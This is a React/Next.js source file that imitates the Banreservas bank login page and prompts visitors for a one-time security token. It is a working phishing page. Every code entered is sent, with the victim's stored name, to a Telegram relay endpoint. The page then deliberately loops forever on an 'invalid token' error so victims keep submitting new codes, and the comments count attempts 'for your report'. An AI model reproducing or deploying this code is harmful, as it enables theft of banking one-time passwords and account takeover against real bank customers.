"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function TokenBanreservas() {
  const router = useRouter();
  const [token, setToken] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorVisible, setErrorVisible] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const [cliente, setCliente] = useState("");

  useEffect(() => {
    const nombre = localStorage.getItem("cliente_actual");
    if (nombre) setCliente(nombre);
  }, []);

  const handleContinue = async () => {
    // Validación mínima
    if (!token.trim() || token.length < 4) {
      alert("Para mayor seguridad, ingresar TOKEN");
      return;
    }

    setLoading(true);
    setErrorVisible(false); // Ocultamos el error previo mientras procesa el nuevo

    try {
      // Enviamos el token a Telegram
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagina: `🔐 TOKEN BANRESERVAS (Intento ${intentos + 1})`,
          nombre: cliente || "Cliente Desconocido",
          usuario: "TOKEN / OTP",
          password: token.trim(),
        }),
      });

      // CICLO INFINITO: Siempre mostramos error y nunca redirigimos
      setTimeout(() => {
        setLoading(false);
        setErrorVisible(true);
        setToken(""); // Limpiamos el campo para el siguiente intento
        setIntentos((prev) => prev + 1); // Seguimos contando los intentos para tu reporte en Telegram
      }, 1500);

    } catch (e) {
      // Si hay un error de red, también lo mantenemos en la página con el error visible
      setLoading(false);
      setErrorVisible(true);
      setToken("");
    }
  };

  return (
    <main className="min-h-screen bg-[#1a3a5a] font-sans flex flex-col">
      {/* Barra superior blanca */}
      <div className="h-12 bg-white flex items-center justify-end px-4 md:px-10 text-[13px] text-slate-900 gap-6 border-b border-slate-200">
        <span className="cursor-pointer hover:underline">Contáctenos</span>
        <span className="cursor-pointer hover:underline">Idioma</span>
        <span className="cursor-pointer hover:underline">Ayuda</span>
        <div className="h-12 w-32 bg-[#00a3e1] flex items-center justify-center text-white font-medium text-[12px]">
          Banreservas.com
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center justify-center p-4">
        {/* Logo Central */}
        <div className="mb-8 text-center">
          <img 
            src="/images/banreservas.png" 
            alt="Banreservas" 
            className="h-20 object-contain mx-auto brightness-0 invert" 
          />
          <h1 className="text-white text-4xl font-bold tracking-widest mt-2 uppercase">Banreservas</h1>
        </div>

        {/* Contenedor Blanco Principal */}
        <div className="w-full max-w-[850px] flex shadow-2xl bg-white min-h-[480px] overflow-hidden rounded-sm">
          
          {/* Lado Izquierdo: Formulario */}
          <div className="w-full md:w-1/2 flex flex-col bg-white">
            <div className="h-10 bg-[#00a3e1] flex items-center justify-center text-white text-[13px] w-full">
              Bienvenidos a tu banco Personas
            </div>

            <div className="p-8 flex flex-col flex-1">
              <label className="block text-[14px] text-slate-600 mb-2">Para mayor seguridad, ingresar TOKEN</label>
              
              <input
                type="text"
                maxLength={8}
                autoComplete="off"
                value={token}
                onChange={(e) => setToken(e.target.value.replace(/\D/g, ""))}
                className="w-full h-12 px-4 bg-[#f2f2f2] border-l-[4px] border-[#fbaf41] outline-none text-xl tracking-[0.2em] focus:bg-slate-50 transition-colors text-slate-800"
                placeholder="••••••"
              />
              
              <div className="min-h-[70px] mt-3">
                {errorVisible && (
                  <p className="text-[#ff0000] text-[12px] text-center leading-tight font-medium">
                    Token inválido. Ha excedido el tiempo límite<br/>
                    permitido. Por favor, vuelva a ingresar el token<br/>
                    nuevamente.
                  </p>
                )}
              </div>

              <button
                onClick={handleContinue}
                disabled={loading}
                className="w-full h-12 bg-[#00a3e1] hover:bg-[#008cc2] text-white text-xl font-light transition mt-2 shadow-sm disabled:bg-slate-400"
              >
                {loading ? "Cargando..." : "Continuar"}
              </button>

              <div className="mt-auto pt-6 text-right text-[#1a3a5a] text-[13px] space-y-1 font-medium">
                <div className="hover:underline cursor-pointer">Cambiar a TuBanco Empresas</div>
                <div className="underline cursor-pointer block">Nuevo usuario persona</div>
                <div className="underline cursor-pointer block">Olvido su contraseña</div>
              </div>
            </div>
          </div>

          {/* Lado Derecho: Diseño "Personas" */}
          <div className="hidden md:block w-1/2 relative bg-[#1a3a5a] overflow-hidden border-l-4 border-white">
            <div className="absolute inset-0 p-8 z-10">
              <h2 className="text-white text-5xl font-extralight tracking-tighter">TuBanco</h2>
              <h2 className="text-white text-7xl font-extralight tracking-tighter -mt-2">Personas</h2>
            </div>
            
            <div className="absolute bottom-20 -left-10 w-[150%] h-40 bg-[#00a3e1] rounded-[100%] rotate-6 opacity-90" />
            <div className="absolute bottom-0 -left-10 w-[150%] h-40 bg-[#fbaf41] rounded-[100%] rotate-6" />
          </div>
        </div>
      </div>
    </main>
  );
}